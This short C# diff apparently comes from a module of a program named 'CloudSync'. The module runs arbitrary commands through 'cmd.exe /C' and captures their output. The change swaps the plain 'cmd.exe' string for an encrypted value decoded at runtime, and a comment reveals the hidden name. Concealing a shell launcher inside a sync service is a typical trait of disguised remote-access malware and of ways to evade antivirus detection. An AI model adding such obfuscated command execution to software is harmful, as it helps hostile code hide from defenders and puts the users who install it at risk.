@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
@@ -16,7 +16,7 @@ namespace CloudSync.Services.Modules
             {
                 var psi = new ProcessStartInfo
                 {
-                    FileName = "cmd.exe",
+                    FileName = StringCipher.Decrypt("Nsd1WTDSdA=="), // "cmd.exe"
                     Arguments = "/C " + command,
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
